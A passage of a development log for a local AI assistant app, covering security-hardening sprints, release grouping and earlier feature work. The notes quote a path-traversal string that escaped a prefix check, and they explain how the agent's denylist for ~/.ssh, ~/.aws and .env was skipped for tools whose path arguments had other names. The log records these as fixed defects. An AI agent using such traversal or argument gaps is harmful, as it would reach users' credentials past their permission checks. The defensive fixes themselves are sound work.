loses the entire session summary, silently. NFR-MAINT-02 is both disk growth and
privacy — every fork holds a full conversation transcript in plain text, and
nothing has ever deleted one.

**Ship this before the next public release.** Silent memory loss is the failure
this product can least afford.

#### Sprint H6b — Pi CLI isolation `[S]` — DONE (2026-07-27)

Unplanned. Reported from a live instance while testing v0.1.4.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| NFR-SEC-19 | Buddy uses its own agent directory, never `~/.pi/agent` | done | (this sprint) |

**Tests at H6b close:** 493 unit + 213 BDD green, typecheck and vite build clean.

**What happened.** The user asked Buddy to search a wiki; it announced it would
use `wiki-kb` — a skill installed globally for the Pi CLI. All three session
creators passed `agentDir: getAgentDir()`, which the SDK resolves to
`~/.pi/agent`.

**NFR-AUTH-ISO isolated the credentials and nothing else.** `agentDir` also
governs skills, `settings.json`, `tools/`, `extensions/`, `prompts/`, the
project trust store and `models.json`. Every Buddy session was inheriting
whatever the user had installed for a different tool.

**Three layers of failure, in order:** the skill is advertised to the model; the
model reads it from `~/.pi/`, which raises a Zone 3 permission prompt for a file
outside the workspace; the skill body then calls for bash, which Buddy excludes.
The middle step is the worst — it trains the user to approve out-of-workspace
access for reasons the product itself invented, right after H1–H4b spent the
sprint tightening exactly that.

**Token cost was the smaller part.** `formatSkillsForPrompt` injects only name,
description and path — a few hundred tokens, not the ~35 KB of SKILL.md bodies.
Worth fixing, but the functional break and the permission-prompt pollution
matter more.

Verified before implementing: with `~/.pi/agent` the loader returns three
skills; with an empty buddy-owned directory it returns none, with no
diagnostics and an empty prompt fragment. A guard test asserts no file in
`backends/` or `scripts/` calls `getAgentDir()`, comment text excluded — checked
by reintroducing the call and watching it fail.

#### Sprint H6c — Viewer navigation `[S]` — DONE (2026-07-27)

Unplanned. Reported while testing H6b against a real wiki.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-CHAT-12 | Navigation inside the inline viewer | done | (this sprint) |

**Tests at H6c close:** 513 unit + 213 BDD green, typecheck and vite build clean.

**Two defects, and the second was the one that mattered.** Links inside an open
document rendered as links but did nothing: the click handler lived in
`ChatView`, bound to the chat container, and the viewer had none. That much was
obvious. The second was not — links inside a document are written *relative to
that document*, so even with a handler every one of them would have been
rejected:

```
[Ley de Hebb](ley-de-hebb.md)
[Neurogénesis y BDNF](../sistema-nervioso-y-cerebro/neurogenesis-bdnf.md)
```

Resolved against the buddy root, the first lands outside the four user-facing
directories and the second walks past the root. `resolveViewablePath` now takes
the document being viewed as the base. Containment is unchanged: segments are
collapsed *after* joining, so a link that walks past the root is still refused
rather than clamped — covered by tests using paths from the real wiki page.

**Back navigation is part of the requirement, not polish.** Following a link
without a way back is a trap: the user leaves the page the assistant cited and
cannot return to it. The trail is per viewing session and resets when the viewer
is opened afresh from a chat message.

**Not wiki-specific**, though FR-WIKI-01..04 will make it the common case: it
applies to any internal document containing links.

#### Sprint H7 — Setup validation `[S]` — DONE (2026-07-27)

Goal: the worker decides what setup is allowed, not the wizard.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-SETUP-11 | Worker validates location before create or adopt | done | (this sprint) |
| FR-SETUP-12 | Incomplete instances detected, not adopted | done | (this sprint) |

**Tests at H7 close:** 532 unit + 214 BDD green, typecheck and vite build clean.

`runSetup` now calls `assertSetupLocationAllowed` before doing anything: create
requires `ok-new`/`ok-empty`, import requires `existing-buddy`. The wizard still
gates too, but the worker decides — the shape H1 established.

**The completeness line moved during implementation, and the tests forced it.**
The first criterion required the full template: git repo, root overlay, all core
brain files. The BDD import fixture — a legitimate hand-made instance with
SOUL.md and AGENTS.md — failed it, which was the fixture telling me the rule was
wrong, not that the fixture was. The line is now *unusable* versus *incomplete
but fixable*:

- **Refused:** no identity at all (neither SOUL.md nor USER.md). That is what a
  failed `createBuddyInstance` leaves behind.
- **Repaired on adopt:** missing git repository (`git init`, no commit) and
  missing `.gitignore` rules. Both additive, neither touching content.

**FR-SETUP-10's contract changed, deliberately.** It promised adoption modifies
nothing. It now adds `.gitignore` rules and a repository when absent. The
scenario `no file inside the buddy directory is modified` became `no
pre-existing file is modified` plus an explicit one asserting the ignore rules
appear. Without them Buddy commits its own locks and session state into the
user's history — a worse violation of "don't touch their directory" than adding
two lines to `.gitignore`.

**Fourth test in the sprint that encoded the old behaviour** (`location.test.ts`
asserted a bare `agent_brain/` was importable — the exact insufficiency
FR-SETUP-12 exists to fix). H1 had two, H3 one, H7 one.

Same shape as H1: validation living only in the UI. Lower probability here
because the wizard does gate correctly — but the consequences are `cpSync` with
`force: true` plus `git init` inside a directory of the user's own files, or
adopting the wreckage of a failed setup and losing auto-commit permanently.

#### Sprint H8 — Containment and hygiene cleanup `[M]` ✅

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| NFR-SEC-16 | Containment primitives unified as one set | done | H8 |
| NFR-SEC-15 | Symlink resolution in containment | done | H8 |
| NFR-SEC-13 | Path-bearing tool args declared | done | H8 |
| NFR-SEC-17 | Restrictive permissions at creation | done | H8 |
| NFR-SEC-18 | Custom provider `baseUrl` validated | done | H8 |
| NFR-REL-07 | Atomic lock acquisition (`wx`) | done | H8 |
| NFR-REL-09 | Timeouts on user-facing network calls | done | H8 |
| NFR-CONFIG-05 | Single config-dir resolver | done | H8 |

**The ordering constraint held.** NFR-SEC-16 first, then `realpath` added once in
`backends/containment.ts` — every enforcement point picked it up from there.

**A fourth containment implementation existed, and it was the broken one.**
The sprint was planned around three primitives (`isWithin`, `normalizeAbPath`,
`resolveViewablePath`). `relocate_brain_file` had a fourth, written as a string
test:

```ts
if (!src.startsWith("agent_brain/")) throw …
```

`agent_brain/../.pi/settings.json` satisfies it. `join()` then collapses the
`..`, and the consolidation session git-mv's the model configuration that
NFR-SEC-06 exists to keep the agent away from. Confirmed by test before fixing:
the call returned `{ rewrittenLinks: [] }` and the file had moved. It was
reachable only from the maintenance session — whose gate denies everything
outside the buddy directory (FR-CONSOL-10) — but the gate reads `args.path`,
and this tool takes `source`/`destination`. Two requirements, one hole, from
opposite ends.

**NFR-SEC-13 turned out to matter more than it looked.** The gate's denylist —
the layer that blocks `~/.ssh`, `~/.aws` and `.env` with no prompt and no
override (FR-PERM-04) — read exactly one argument name. `copy_file` and
`move_file` name theirs `source` and `destination`, so it never ran for them.
`shared/tool-paths.ts` declares them, and a guard test fails the suite when a
registered tool has a path-shaped parameter absent from the table: the failure
mode is quiet by construction, because an undeclared argument is not rejected,
it is ignored.

**NFR-SEC-18 was amended, deliberately.** See the SPEC entry. The requirement
said "the same destination rules as `fetch_url`", which refuses loopback — and
`http://localhost:11434/v1` is what a user points at Ollama. The BDD scenario
for the custom provider failed on exactly that string, which is the fixture
telling the truth. `assertSafeProviderBaseUrl` is now separate from
`assertSafeUrl` and documents why: `fetch_url`'s URL is chosen by the agent,
this one is typed by the user.

**Two defects found while implementing, neither on the sprint list:**
- The synchronous lock in `state-file.ts` could not tell ENOENT from "already
  exists", so the first write into a config directory that did not exist yet
  spun for the full timeout and then reported the lock held by another process.
- `acquireLock` in `maintenance.ts` was check-then-unlink-then-write. Now a
  single `wx` create. **Honest limit:** the race is not reproducible in a
  single-process suite. The tests pin the surrounding behaviour; atomicity here
  is guaranteed by construction, not by a test that fails without it.

**M1–M7.** `pageUrl` was unused and the caller ran `parseHTML` twice over the
same document (up to 10 MB) just to read `document.title` — `htmlToMarkdown` now
returns both. `usage-tracker`'s methods reached `getUsageReport` through `this`,
which breaks the moment one is destructured or passed as a callback; now a
closure, with tests for both call shapes. The empty-catch audit came back clean:
95 catch blocks, 23 that swallow, all 23 already carrying a written reason.

**M3 not done, on purpose.** `embedded-assets.generated.ts` (1.2 MB) is
regenerated by `build-worker.sh` before every compile, so committing it is
redundant — but `tsc` and `vite build` need it present, so gitignoring it makes
a fresh clone fail typecheck until a `bun` script has run. Trading a build-flow
change for a diff-size win at the end of a security sprint is the wrong order;
left for a decision of its own.

---

**Scope note (2026-07-27).** All five findings with a confirmed exploit path are
closed: traversal, XSS, budget drain, SSRF, and the ungated maintenance session.
H5–H8 are robustness, hygiene and defense in depth — real, but a different
category. The decision taken was to finish them before starting FR-WIKI rather
than interleaving.

---

**Suggested release grouping**

| Release | Sprints | Status | Rationale |
|---------|---------|--------|-----------|
| v0.1.1 | H1 + H2 | **tagged 2026-07-27** | The two confirmed-exploitable findings — shipped as soon as they were green rather than held for H3 |
| v0.1.2 | H3 | planned | Budget drain. No attacker needed, so it ships on its own rather than waiting for H4/H5 |
| v0.1.3 | H4 + H4b | **tagged 2026-07-27** | SSRF and the ungated maintenance session |
| v0.1.4 | H5 + H6 | planned | Losing credentials and losing memory — the two remaining ways state disappears |
| v0.1.5 | H7 + H8 | planned | Setup validation and cleanup |

**Changed from the original grouping (Jul 27):** v0.1.1 was planned as H1+H2+H3.
H1 and H2 closed green and fix the two findings an attacker could actually reach,
so they shipped immediately instead of waiting for H3. H3 became v0.1.2 rather
than being merged into a later release, because budget drain affects a real user
with no attacker involved.

**Spec amendments made by this sprint (deliberate divergence, not drift):**

| What | Why |
|------|-----|
| FR-CHAT-09 | Withdrew the `openPath()` click behavior. Buddy no longer opens files with external programs. |
| FR-CHAT-10 | Removed the "Open externally" affordance; content now read by the worker. |
| NFR-REL-04 | Amended — original wording specified the unbounded retry loop that is R1. |
| FR-NET-01 | Noted that destination safety is worker-side, not user domain approval. |

**BDD scenarios deliberately deleted:** `Clicking a PDF link falls back to the
system app` and `Open externally uses the system opener` — both encoded the
behavior now considered unsafe.

**ID collisions found while planning** (avoid re-using): `NFR-SEC-07` (credential
isolation), `NFR-CONFIG-04` (boot refresh), `FR-NET-02` (web search) were already
taken by unrelated requirements.

**Not yet reviewed** (second-pass candidates): `reflect-child.ts`,
`oauth-service.ts`, `setup-controller.ts` / `SetupWizard.svelte`, `scripts/`.
Verified clean during planning: dev bridge (`import.meta.env.DEV`-gated),
`hebbian.ts` (cannot write outside `agent_brain/`).

### Jul 26 — PDF extraction compiled-binary fix (2026-07-26)

| Item | Description | Commit |
|------|-------------|--------|
| Embedded pdfjs worker | `generate-embedded-assets.ts` embeds `pdf.worker.min.mjs`; `pdf-extract.ts` writes to temp on first use | 5200f6e |
| EmbeddedAssets interface | Added `pdfWorker?: string` field | 5200f6e |
| Sidecar registration | `sidecar-entry.ts` passes `EMBEDDED_PDF_WORKER` to `registerEmbeddedAssets()` | 5200f6e |

### Jul 26 — File operations tools — DONE (2026-07-26)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-DELETE-01 | Restricted file deletion (user confirmation) | done | (this sprint) |
| FR-FILE-01 | copy_file (external → user/downloads) | done | (this sprint) |
| FR-FILE-02 | move_file (within workspace, git mv) | done | (this sprint) |

**Tests at file ops close:** 308 unit + 163 BDD green.

### Jul 26 — Session boot, reflect quality, docs sync — DONE (2026-07-26)

| Item | Description | Commit |
|------|-------------|--------|
| Context injection fix | Silent injection before worker core; no visible boot response | 8690d7f |
| Warm handoff fix | Moved before worker core; prevents duplicate greeting events | 72f6ce0 |
| First-session skip | Skip context injection when `firstSession && personalizationPending` | 28f88c0 |
| Reflect prompt rewrite | Lean process-conversation.md; synthesize don't transcribe; omit empty sections | 558761f |
| OUTPUT_ONLY_SUFFIX | Produce ONLY `## Session HH:MM–HH:MM` block | 558761f |
| Core skills removed from templates | `agent_brain/skills/.gitkeep` only; core prompts in `~/.buddy/prompts/` | e10560c |
| AGENTS.md identity | "Buddy, a personal assistant" (not "context processor") | 3bb1409 |
| agents-base self-reference | Docs authoritative for capability/memory questions | c25ea88 |
| GTD explainer | Added to `bundled/docs/capabilities.md` | 4962adf |
| Reflect eval harness | `scripts/test-reflect.ts` + 5 conversation fixtures | a1bff51 |
| FR-PROMPT-04 | Marked done in SPEC | (doc sync) |

**Tests at session-boot sprint close:** 287 unit + 149 BDD green.

### Bug fixes + self-awareness prompt (2026-07-25)

| Fix | Description | Files |
|-----|-------------|-------|
| FR-CHAT-05 | Stale "Pensando..." after turn: removed toggle, indicator transient-only | MessageBubble.svelte, i18n |
| FR-PERM-06 | "Allow always" never persisted: dropped `persist` arg in ChatView + stale in-memory ref in gate | ChatView.svelte, permissions.ts, session-boot.ts, agent-worker.ts |
| FR-DOCS-01 (partial) | Self-awareness block in `agents-base.md`: tools list, capabilities, limitations, pointer to `~/.buddy/docs/` | bundled/prompts/agents-base.md |

**Tests after fixes:** 287 unit + 146 BDD green.

### FR-NET-01: URL content fetch — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-NET-01 | `fetch_url` tool (HTML→markdown, PDF, image) | done | e2750d1 |

**Tests at FR-NET-01 close:** 286 unit + 146 BDD green.

### E16 — Consolidation relocate tool (2026-07-25)

| FR-ID | Feature | Status | Notes |
|-------|---------|--------|-------|
| FR-CONSOL-07 | `relocate_brain_file` tool (git mv + link rewrite) | done | Consolidation sessions only |
| FR-SKILL-05 | Skill tools wired into maintenance session | done | `triage_inbox` via tool, not file read |

**Tests at E16 close:** 273 unit + 139 BDD green.

Resolves eval issue #8 — depth-3 grouping can now physically move files into subdirectories.

### Eval sprint: FR-BRAIN-04/05 consolidation quality — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-BRAIN-04 | Consolidation skill produces meaningful summaries | done | b9c5ee3 |
| FR-BRAIN-05 | Observation pipeline captures and promotes patterns | done | b9c5ee3 |

Eval results in `my-ab/agent_brain/projects/agentic-buddy/eval-results.md`. 5 runs (depth 1–3). Fixes shipped:
- Ripe observation extraction + injection into consolidation prompt header
- Programmatic `logs/index.md` update from Day summary Key themes (worker code, not LLM)
- Depth 2/3 explicit steps in `consolidation.md` (weekly journal, idea review, grouping, hygiene)
- Maintenance index upsert preserves curated active descriptions (`10d39dc`)

**Tests at sprint close:** 268 unit + 136 BDD green.

Issue #8 (physical brain file grouping) resolved in E16 via FR-CONSOL-07.

### Sprint 3.5: Inline file viewer — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-10 | Inline file viewer for markdown/text links | done | 5299c10 |

**Tests at sprint close:** 262 unit + 136 BDD green.

### Sprint 3: Brain format + health linter — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| NFR-FORMAT-01 | `summary` frontmatter in agent_brain templates | done | d948936 |
| FR-BRAIN-07 | Brain health linter (structural checks, worker code) | done | d948936 |

**Tests at sprint close:** 250 unit + 128 BDD green.

### Sprint 2: Skills as Tools — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-SKILL-01 | Skill tools registered at session creation | done | 7a40949 |
| FR-SKILL-02 | process_conversation tool for manual reflect | done | 7a40949 |
| FR-SKILL-03 | triage_inbox tool for inbox processing | done | 7a40949 |
| FR-SKILL-04 | Reflect child uses bundled process-conversation prompt | done | 0588329 |
| FR-SKILL-05 | Consolidation invokes triage via tool call | done | (see E16) |
| FR-BRAIN-06 | AGENTS.md skill-free (skills via tool descriptions) | done | a835d09 |

**Tests at sprint close:** 237 unit + 122 BDD green.

### Sprint 1: Reflect realignment + housekeeping — DONE (2026-07-25)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-REFLECT-03 | Compaction-only checkpoint trigger (turn count removed) | done | fd5ee21 |
| FR-REFLECT-05 | Session persistence + crash recovery | done | bfa505a |
| NFR-MIGRATE-06 | Boot refresh on app version change (prompts + docs deploy) | done | (unify) |
| NFR-MAINT-01 | Session log retention (7-day prune) | done | 7845c28 |

### Sprint: Settings access UI — DONE (2026-07-22)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-SETTINGS-05 | Gear icon + Buddy → Settings menu (Cmd+,) | done | 2e051c5 |

### Sprint: Settings model switch — DONE (2026-07-21)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-SETTINGS-03 | Cross-provider model dropdown + add-provider auth | done | cece2f0 |
| FR-SETTINGS-04 | Language switching (from FR-SETTINGS-02) | done | 6ea7f89 |

Model switch resolves Pi models via `ModelRuntime`, persists to `.pi/settings.json`
and `~/.buddy/config.json`. Input bar model selector remains future work (FR-SHELL-05 gap).

### Sprint: Chat polish + Settings — DONE (2026-07-21)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-08 | Textarea height reset after send | done | 491b6e9 |
| FR-REFLECT-04 | Reflect log output sanitizer | done | 7c5bd69 |
| FR-SETTINGS-02 | Settings modal (Cmd/Ctrl+,) | done | 6ea7f89 |

### Sprint: OAuth Setup — DONE (2026-07-20)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-SETUP-05 | OAuth primary + API key fallback + live model list | done | da071a6 |

Also: `ProviderStep` / `ModelStep` wizard components; `OAuthService` worker wrapper;
`provider-mapping.ts` (ab-app ↔ Pi SDK ids); BDD `setup-oauth.feature` (3 scenarios).

### Sprint: Chat Display Polish — DONE (2026-07-20)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-05 | Thinking block display (transient indicator) | done | 5e89120 |
| FR-CHAT-06 | Tool call display (expandable activity block) | done | 5e89120 |
| FR-DEFERRED-01 visual | Welcome banner with deferred cards or greeting | done | 5e89120 |

Also: `logs/index.md` format fix (stem as key, no truncation) — `30b4296`, `6f88dd1`.

### Sprint: File Ingest — DONE (2026-07-19)

| FR-ID | Feature | Status |
|-------|---------|--------|
| FR-INGEST-01 | Drag & drop onto chat window | done |
| FR-INGEST-02 | Attach button (native file picker) | done |
| FR-INGEST-03 | Implicit read permission for attached paths | done |
| FR-INGEST-04 | Format validation (.md, .txt, extensionless) | done |
| FR-INGEST-05 | Image attachments via Pi vision API | done |

### Sprint: Reflect Hardening — DONE (2026-07-19)

Post-review fixes from `REVIEW-HANDOFF.md` findings A + B + G + C:

| Fix | Description | Commit |
|-----|-------------|--------|
| A | True fork via `SessionManager.forkFrom` (child no longer writes to live JSONL) | fe8c242 |
| B | Write-phase-only lock with retry in reflect child (prevents git index.lock races without blocking LLM) | c647df3 |
| G | `lifecycle.flush()` before shutdown (no lost events) | fe8c242 |
| C | BDD catch-up test realigned to production spawn path (`reflect-recovery.ts`) | 50ad118 |

### Sprint: Config Defaults + Doc Sync — DONE (2026-07-19)

| Task | Description | Commit |
|------|-------------|--------|
| NFR-CONFIG-01/03 | `shared/defaults.ts` — centralized operational + security constants | 2b9bc53 |
| Finding E | Unified model catalog (detect-auth uses model-catalog helpers) | 2b9bc53 |
| Finding D | Incremental reflect uses fast-tier model + minimal thinking | 2b9bc53 |
| Doc sync | specs/SPEC.md + docs/app-spec-tauri.md aligned with forkFrom, systemPromptOverride | 2b9bc53 |

### Sprint: Misc fixes — DONE (2026-07-19)

| Task | Description | Commit |
|------|-------------|--------|
| Index format | logs/index.md uses one-liner summaries + path format description | 5f91d12, c647df3 |
| i18n locale | Detect system locale on startup + bilingual language picker | 7067065 |
| FR-INGEST-05 | Image attachments via Pi vision API (PromptOptions.images) | b894fe0 |

### Sprint: Memory Loop — DONE

| Order | FR-ID | Feature | Status |
|-------|-------|---------|--------|
| 1 | FR-GIT-01 | Auto-commit after agent writes | done |
| 2 | FR-SESSION-03 | Session end on app close | done |
| 3 | FR-REFLECT-01 | Factual skeleton (crash fallback) | done |
| 4 | FR-REFLECT-02 | Forked reflect on session end (background child) | done |
| 5 | FR-REFLECT-03 | Incremental mid-session reflect (background child) | done |
